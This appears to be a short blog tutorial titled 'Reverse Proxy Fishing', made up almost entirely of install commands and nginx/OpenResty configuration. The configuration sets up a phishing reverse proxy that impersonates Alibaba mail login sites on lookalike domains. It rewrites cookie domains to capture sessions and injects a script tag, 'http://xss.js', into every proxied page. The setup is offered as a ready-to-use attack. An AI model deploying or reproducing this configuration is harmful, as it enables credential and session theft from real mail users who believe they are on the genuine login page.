---
title: Reverse Proxy Fishing
date: 2016-04-16 02:13:37
tags: Reverse Proxy
---

### environment


```
Nginx
Openresty
CentOS release 6.7 (Final)
example:
    target:mail.ali.com/mailsso.mxhichina.com    阿里邮箱
    myself domain: mail.safebuff.com/mailsso.safebuff.com
```

### Install Nginx && Openresty
```
> yum install epel-release
> yum install nginx -y
> ./configure --with-http_sub_module --with-pcre-jit --with-ipv6 --add-module=/root/openresty/ngx_http_substitutions_filter_module --without-http_rewrite_module
> make && make install
> /usr/local/openresty/nginx/sbin/nginx     #start nginx
```
<!--more-->
nginx conf file
```
> vi /usr/local/openresty/nginx/conf/nginx.conf
```

```
server {
        listen       80;
        server_name  mail.safebuff.com;

        #charset koi8-r;

        #access_log  logs/host.access.log  main;

        location / {
		root   html;
		index  index.html index.htm index.php default.htm default.html default.php;
	    proxy_pass http://mail.ali.com;
		proxy_set_header Accept-Encoding "";
	    proxy_cookie_domain mail.ali.com mail.safebuff.com;
		proxy_buffering off;
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header User-Agent $http_user_agent;
		proxy_set_header referer "http://mail.safebuff.com/$http_referer";
        subs_filter </head> '<script src="http://xss.js"></script></head>';
		subs_filter https://mail.ali.com http://mail.safebuff.com;
		subs_filter mail.ali.com mail.safebuff.com;
	}

        #error_page  404              /404.html;

        # redirect server error pages to the static page /50x.html
        #
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }

        # proxy the PHP scripts to Apache listening on 127.0.0.1:80
        #
        #location ~ \.php$ {
        #    proxy_pass   http://127.0.0.1;
        #}

        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
        #
        #location ~ \.php$ {
        #    root           html;
        #    fastcgi_pass   127.0.0.1:9000;
        #    fastcgi_index  index.php;
        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
        #    include        fastcgi_params;
        #}

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #    deny  all;
        #}
    }


    server {
        listen       80;
        server_name  mailsso.safebuff.com;

        #charset koi8-r;

        #access_log  logs/host.access.log  main;

        location / {
		root   html;
		index  index.html index.htm index.php default.htm default.html default.php;
	    proxy_pass https://mailsso.mxhichina.com;
		proxy_set_header Accept-Encoding "";
	    proxy_cookie_domain mailsso.mxhichina.com mailsso.safebuff.com;
		proxy_buffering off;
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header User-Agent $http_user_agent;
		proxy_set_header referer "http://mailsso.mxhichina.com/$http_referer";
		subs_filter mailsso.mxhichina.com mailsso.safebuff.com;
        subs_filter </head> '<script src="http://xss.js"></script></head>';
	}

        #error_page  404              /404.html;

        # redirect server error pages to the static page /50x.html
        #
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }

        # proxy the PHP scripts to Apache listening on 127.0.0.1:80
        #
        #location ~ \.php$ {
        #    proxy_pass   http://127.0.0.1;
        #}

        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
        #
        #location ~ \.php$ {
        #    root           html;
        #    fastcgi_pass   127.0.0.1:9000;
        #    fastcgi_index  index.php;
        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
        #    include        fastcgi_params;
        #}

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #    deny  all;
        #}
    }

```



